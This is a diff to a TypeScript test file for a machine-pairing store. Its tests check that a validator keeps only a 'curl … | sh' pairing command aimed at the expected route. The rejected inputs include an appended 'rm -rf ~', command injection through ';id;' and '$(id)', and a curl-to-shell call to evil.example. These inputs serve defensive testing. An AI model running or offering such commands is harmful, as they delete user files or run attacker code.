@@ -33,6 +33,7 @@ import {
   sanitizeBoxOffersResponse,
   sanitizeBoxProviderInfo,
   sanitizeBoxSummary,
+  sanitizeByoPairingResponse,
   sanitizeBoxesResponse
 } from "./validate.ts";
 import { box, change, kind, offers, provider } from "./fixtures.test-helpers.ts";
@@ -56,7 +57,6 @@ function fakeApi(overrides: Partial<Record<keyof BoxesApi, unknown>> = {}, conne
   const api: Record<string, unknown> = {
     connection: { id: connection },
     listBoxes: async () => (calls.push("listBoxes"), listOf(box())),
-    getBox: async (id: string) => (calls.push(`getBox:${id}`), { box: box({ id }) }),
     destroyBox: async (id: string) => (calls.push(`destroyBox:${id}`), { box: box({ id, state: "destroying" }) }),
     listBoxKinds: async () => (calls.push("listBoxKinds"), { kinds: [kind()] }),
     listBoxProviders: async () => (calls.push("listBoxProviders"), { providers: [provider()] }),
@@ -516,5 +516,35 @@ describe("the boxes store", () => {
     assert.equal(projectBoxIn([temp], path), undefined);
     assert.equal(projectBoxIn(null, path), undefined);
     assert.equal(projectBoxIn([live], undefined), undefined);
+  });
+});
+
+describe("bring-your-own machine payloads", () => {
+  const machine = { ...box(), id: "m1", purpose: "machine", provider: "byo", sizeLabel: "Mac mini", state: "pairing", deviceHost: true, byo: { name: "Mac mini", pairingExpiresAt: "2026-10-27T10:30:00.000Z" } };
+
+  it("keeps the machine purpose, the new states, the device-host flag and the byo fields", () => {
+    const clean = sanitizeBoxSummary(machine)!;
+    assert.equal(clean.purpose, "machine");
+    assert.equal(clean.state, "pairing");
+    assert.equal(clean.deviceHost, true);
+    assert.deepEqual(clean.byo, { name: "Mac mini", pairingExpiresAt: "2026-10-27T10:30:00.000Z" });
+    assert.equal(sanitizeBoxSummary({ ...machine, state: "offline" })?.state, "offline");
+    // A byo box with a broken byo field still shows, named after its size label.
+    assert.deepEqual(sanitizeBoxSummary({ ...machine, byo: 3 })?.byo, { name: "Mac mini", pairingExpiresAt: null });
+    assert.equal(sanitizeBoxSummary({ ...box(), deviceHost: "yes" })?.deviceHost, undefined);
+  });
+
+  it("a pairing answer is kept only with a curl … | sh command to the pair route", () => {
+    const command = "curl -fsSL https://orq.example.com/api/boxes/pair/AbC_12-x | sh";
+    const response = { box: machine, command, expiresAt: "2026-10-27T10:30:00.000Z" };
+    assert.equal(sanitizeByoPairingResponse(response)?.command, command);
+    for (const unsafe of [
+      `${command}; rm -rf ~`,
+      "curl -fsSL https://orq.example.com;id;/api/boxes/pair/AbC_12-x | sh",
+      "curl -fsSL https://$(id)/api/boxes/pair/AbC_12-x | sh",
+      "curl -fsSL https://evil.example/x | sh"
+    ]) assert.equal(sanitizeByoPairingResponse({ ...response, command: unsafe }), null, unsafe);
+    assert.equal(sanitizeByoPairingResponse({ ...response, box: null }), null);
+    assert.equal(sanitizeByoPairingResponse({ box: machine, command }), null);
   });
 });
